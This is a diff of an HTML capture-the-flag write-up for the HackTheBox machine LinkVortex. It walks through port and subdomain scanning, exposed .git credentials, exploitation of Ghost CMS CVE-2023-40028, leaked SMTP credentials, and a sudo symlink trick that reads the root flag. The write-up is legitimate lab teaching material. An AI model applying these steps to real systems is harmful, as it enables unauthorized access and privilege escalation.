@@ -3,165 +3,299 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LinkVortex - HackTheBox Write-up</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.6;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-            color: #333;
-        }
-        pre {
-            background-color: #f4f4f4;
-            padding: 15px;
-            border-radius: 5px;
-            overflow-x: auto;
-        }
-        code {
-            font-family: 'Courier New', Courier, monospace;
-        }
-        h1, h2, h3 {
-            color: #2c3e50;
-        }
-        .machine-info {
-            background-color: #f8f9fa;
-            padding: 20px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
-        table {
-            border-collapse: collapse;
-            width: 100%;
-            margin: 15px 0;
-        }
-        th, td {
-            border: 1px solid #ddd;
-            padding: 8px;
-            text-align: left;
-        }
-        th {
-            background-color: #f2f2f2;
-        }
-        .flag {
-            background-color: #e8f5e9;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 10px 0;
-        }
-    </style>
+    <title>LinkVortex Write-up | D4rkm4g1c</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/style.css">
+    <link rel="stylesheet" href="../../style.css">
 </head>
 <body>
-    <h1>🎯 LinkVortex - HackTheBox Write-up</h1>
+    <nav id="navbar">
+        <div class="container">
+            <a href="/" class="logo">D4rkm4g1c</a>
+            <ul class="nav-links">
+                <li><a href="/">Home</a></li>
+                <li><a href="/content/ctf">Write-ups</a></li>
+                <li><a href="/#about">About</a></li>
+            </ul>
+        </div>
+    </nav>
 
-    <div class="machine-info">
-        <strong>Category:</strong> Miscellaneous<br>
-        <strong>Difficulty:</strong> Easy<br>
-        <strong>Platform:</strong> HackTheBox<br>
-        <strong>Release Date:</strong> 2023<br>
-        <strong>Target IP:</strong> 10.10.11.47
-    </div>
+    <main class="container">
+        <article class="writeup">
+            <header class="writeup-header">
+                <h1>LinkVortex</h1>
+                <div class="writeup-meta">
+                    <span class="tag">HackTheBox</span>
+                    <span class="tag">Easy</span>
+                    <span class="tag">Ghost CMS</span>
+                    <span class="tag">Privilege Escalation</span>
+                </div>
+                <p class="lead">A Ghost CMS instance with security misconfigurations leading to unauthorized access and privilege escalation.</p>
+            </header>
 
-    <h2>📝 Challenge Description</h2>
-    <p>A Ghost CMS instance with potential security misconfigurations and vulnerabilities that could lead to unauthorised access.</p>
+            <div class="writeup-content">
+                <section id="overview">
+                    <h2>Overview</h2>
+                    <div class="card">
+                        <ul>
+                            <li><strong>Category:</strong> Miscellaneous</li>
+                            <li><strong>Difficulty:</strong> Easy</li>
+                            <li><strong>Platform:</strong> HackTheBox</li>
+                            <li><strong>Release Date:</strong> 2023</li>
+                            <li><strong>Target IP:</strong> 10.10.11.47</li>
+                        </ul>
+                    </div>
+                </section>
 
-    <h2>🔍 Reconnaissance</h2>
-    
-    <h3>Port Scanning</h3>
-    <pre><code># Full TCP port scan
+                <section id="recon">
+                    <h2>Reconnaissance</h2>
+                    
+                    <h3>Port Scanning</h3>
+                    <pre><code># Full TCP port scan
 nmap -sC -sV -T4 -p- 10.10.11.47</code></pre>
 
-    <h4>Results:</h4>
-    <table>
-        <tr>
-            <th>Port</th>
-            <th>State</th>
-            <th>Service</th>
-            <th>Version</th>
-        </tr>
-        <tr>
-            <td>22/tcp</td>
-            <td>Open</td>
-            <td>SSH</td>
-            <td>OpenSSH 8.9p1 Ubuntu 3ubuntu0.10</td>
-        </tr>
-        <tr>
-            <td>80/tcp</td>
-            <td>Open</td>
-            <td>HTTP</td>
-            <td>Apache httpd</td>
-        </tr>
-    </table>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Port</th>
+                                <th>State</th>
+                                <th>Service</th>
+                                <th>Version</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>22/tcp</td>
+                                <td>Open</td>
+                                <td>SSH</td>
+                                <td>OpenSSH 8.9p1 Ubuntu 3ubuntu0.10</td>
+                            </tr>
+                            <tr>
+                                <td>80/tcp</td>
+                                <td>Open</td>
+                                <td>HTTP</td>
+                                <td>Apache httpd</td>
+                            </tr>
+                        </tbody>
+                    </table>
 
-    <h3>Web Enumeration</h3>
-    <p>Initial enumeration revealed a subdomain: <code>dev.linkvortex.htb</code></p>
+                    <h4>Additional Details</h4>
+                    <ul>
+                        <li>HTTP server redirects to <code>http://linkvortex.htb/</code></li>
+                        <li>SSH host keys:
+                            <ul>
+                                <li>ECDSA: <code>256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb</code></li>
+                                <li>ED25519: <code>256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13</code></li>
+                            </ul>
+                        </li>
+                    </ul>
 
-    <h4>Git Repository Investigation</h4>
-    <p>Found exposed Git repository at <code>dev.linkvortex.htb/.git/</code> containing sensitive information:</p>
-    <ul>
-        <li>Ghost CMS version 5.58.0 identified in Dockerfile</li>
-        <li>Exposed test credentials:
-            <ul>
-                <li>Email: <code>test@example.com</code></li>
-                <li>Password: <code>OctopiFociPilfer45</code></li>
-            </ul>
-        </li>
-    </ul>
+                    <h3>Web Enumeration</h3>
+                    
+                    <h4>Directory Enumeration (Main Domain)</h4>
+                    <pre><code>gobuster dir -u http://linkvortex.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt</code></pre>
 
-    <h2>🔓 Initial Access</h2>
-    <p>Access was gained through Ghost CMS exploitation using CVE-2023-40028. Key findings included:</p>
-    <ul>
-        <li>Valid admin email: <code>admin@linkvortex.htb</code></li>
-        <li>SMTP credentials in configuration file:
-            <ul>
-                <li>User: <code>bob@linkvortex.htb</code></li>
-                <li>Password: <code>fibber-talented-worth</code></li>
-            </ul>
-        </li>
-    </ul>
+                    <h4>Subdomain Enumeration</h4>
+                    <pre><code>ffuf -u http://linkvortex.htb/ -w /usr/share/wordlists/Custom/DNS/n0kovo_subdomains_huge.txt \
+     -H "Host:FUZZ.linkvortex.htb" -mc 200 -fs 178 -o dnsresults -of md -v</code></pre>
 
-    <h2>🔐 Privilege Escalation</h2>
-    <p>Privilege escalation was achieved through a sudo permission vulnerability:</p>
-    <pre><code>User bob may run the following commands on linkvortex:
+                    <h4>Discovered Subdomains</h4>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Subdomain</th>
+                                <th>Status</th>
+                                <th>Content Length</th>
+                                <th>Type</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>dev</td>
+                                <td>200</td>
+                                <td>2538</td>
+                                <td>text/html</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <h4>Git Repository Enumeration</h4>
+                    <p>Found exposed Git repository at <code>dev.linkvortex.htb/.git/</code></p>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Path</th>
+                                <th>Status</th>
+                                <th>Size</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr><td>/.git/</td><td>301</td><td>239</td></tr>
+                            <tr><td>/.git/HEAD</td><td>200</td><td>41</td></tr>
+                            <tr><td>/.git/config</td><td>200</td><td>201</td></tr>
+                            <tr><td>/.git/logs/</td><td>200</td><td>868</td></tr>
+                            <tr><td>/.git/index</td><td>200</td><td>707577</td></tr>
+                        </tbody>
+                    </table>
+
+                    <h3>Source Code Analysis</h3>
+                    <h4>Git Repository Investigation</h4>
+                    <pre><code>git status
+
+# Output:
+Not currently on any branch.
+Changes to be committed:
+  (use "git restore --staged <file>..." to unstage)
+        new file:   Dockerfile.ghost
+        modified:   ghost/core/test/regression/api/admin/authentication.test.js</code></pre>
+
+                    <p>Analyzing the changes revealed:</p>
+                    <pre><code>diff --git a/Dockerfile.ghost b/Dockerfile.ghost
+new file mode 100644
+index 0000000..50864e0
+--- /dev/null
++++ b/Dockerfile.ghost
+@@ -0,0 +1,16 @@
++FROM ghost:5.58.0
++
++# Copy the config
++COPY config.production.json /var/lib/ghost/config.production.json
++
++# Prevent installing packages
++RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
++
++# Wait for the db to be ready first
++COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
++COPY entry.sh /entry.sh
++RUN chmod +x /var/lib/ghost/wait-for-it.sh
++RUN chmod +x /entry.sh
++
++ENTRYPOINT ["/entry.sh"]
++CMD ["node", "current/index.js"]</code></pre>
+
+                    <pre><code>diff --git a/ghost/core/test/regression/api/admin/authentication.test.js b/ghost/core/test/regression/api/admin/authentication.test.js
+index 2735588..e654b0e 100644
+--- a/ghost/core/test/regression/api/admin/authentication.test.js
++++ b/ghost/core/test/regression/api/admin/authentication.test.js
+@@ -53,7 +53,7 @@ describe('Authentication API', function () {
+ 
+         it('complete setup', async function () {
+             const email = 'test@example.com';
+-            const password = 'thisissupersafe';
++            const password = 'OctopiFociPilfer45';</code></pre>
+                </section>
+
+                <section id="initial-access">
+                    <h2>Initial Access</h2>
+                    
+                    <h3>Ghost CMS Exploitation</h3>
+                    <ul>
+                        <li><strong>Vulnerability:</strong> CVE-2023-40028 (Ghost CMS v5.58)</li>
+                        <li><strong>Exploit Tool:</strong>
+                            <pre><code>./cve-2023-40028 -u <username> -p <password> -h <host_url></code></pre>
+                        </li>
+                    </ul>
+
+                    <h3>Configuration File Extraction</h3>
+                    <p>Retrieved <code>/var/lib/ghost/config.production.json</code>:</p>
+                    <pre><code>{
+  "url": "http://localhost:2368",
+  "server": {
+    "port": 2368,
+    "host": "::"
+  },
+  "mail": {
+    "transport": "SMTP",
+    "options": {
+      "service": "Google",
+      "host": "linkvortex.htb",
+      "port": 587,
+      "auth": {
+        "user": "bob@linkvortex.htb",
+        "pass": "fibber-talented-worth"
+      }
+    }
+  },
+  "spam": {
+    "user_login": {
+      "minWait": 1,
+      "maxWait": 604800000,
+      "freeRetries": 5000
+    }
+  }
+}</code></pre>
+
+                    <h3>SSH Access</h3>
+                    <ul>
+                        <li>Successfully authenticated as user <code>bob</code> using discovered credentials</li>
+                        <li>User flag obtained</li>
+                    </ul>
+                </section>
+
+                <section id="privesc">
+                    <h2>Privilege Escalation</h2>
+                    
+                    <h3>Sudo Permissions Analysis</h3>
+                    <pre><code>sudo -l
+
+# Output:
+User bob may run the following commands on linkvortex:
     (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</code></pre>
 
-    <h3>Exploitation Steps:</h3>
-    <pre><code># Create symlinks
+                    <h3>Root Flag Extraction</h3>
+                    <pre><code># Create symlinks
 ln -s /root/root.txt /home/bob/test.txt
 ln -s /home/bob/test.txt /home/bob/test.png
 
 # Execute exploit
 sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/test.png</code></pre>
+                </section>
 
-    <h2>🏁 Flags</h2>
-    <div class="flag">
-        <strong>User Flag:</strong> <code>e9e77193e25870661af3813cab24a91c</code><br>
-        <strong>Root Flag:</strong> <code>cdf8ecab5aace4312e2b04673c4fe73d</code>
-    </div>
+                <section id="flags">
+                    <h2>Flags</h2>
+                    <div class="card">
+                        <p><strong>User Flag:</strong> <code>e9e77193e25870661af3813cab24a91c</code></p>
+                        <p><strong>Root Flag:</strong> <code>cdf8ecab5aace4312e2b04673c4fe73d</code></p>
+                    </div>
+                </section>
 
-    <h2>💡 Key Takeaways</h2>
-    <ol>
-        <li>Always check for exposed Git repositories and analyze their contents</li>
-        <li>Version-specific vulnerabilities in CMS systems can be critical (Ghost CMS 5.58)</li>
-        <li>Configuration files often contain valuable credentials</li>
-        <li>Symlink attacks can be effective for privilege escalation when combined with sudo permissions</li>
-    </ol>
+                <section id="takeaways">
+                    <h2>Key Takeaways</h2>
+                    <ol>
+                        <li>Always check for exposed Git repositories and analyze their contents</li>
+                        <li>Version-specific vulnerabilities in CMS systems can be critical (Ghost CMS 5.58)</li>
+                        <li>Configuration files often contain valuable credentials</li>
+                        <li>Symlink attacks can be effective for privilege escalation when combined with sudo permissions</li>
+                    </ol>
+                </section>
 
-    <h2>🛠️ Tools Used</h2>
-    <ul>
-        <li>nmap</li>
-        <li>gobuster</li>
-        <li>ffuf</li>
-        <li>git</li>
-        <li>CVE-2023-40028 exploit</li>
-        <li>Basic Linux commands (ln, sudo)</li>
-    </ul>
+                <section id="tools">
+                    <h2>Tools Used</h2>
+                    <ul>
+                        <li>nmap</li>
+                        <li>gobuster</li>
+                        <li>ffuf</li>
+                        <li>git</li>
+                        <li>CVE-2023-40028 exploit</li>
+                        <li>Basic Linux commands (ln, sudo)</li>
+                    </ul>
+                </section>
 
-    <h2>📚 References</h2>
-    <ul>
-        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-40028">Ghost CMS CVE-2023-40028</a></li>
-        <li><a href="https://ghost.org/docs/">Ghost CMS Documentation</a></li>
-    </ul>
+                <section id="references">
+                    <h2>References</h2>
+                    <ul>
+                        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-40028">Ghost CMS CVE-2023-40028</a></li>
+                        <li><a href="https://ghost.org/docs/">Ghost CMS Documentation</a></li>
+                    </ul>
+                </section>
+            </div>
+        </article>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 D4rkm4g1c. All rights reserved.</p>
+        </div>
+    </footer>
 </body>
 </html>
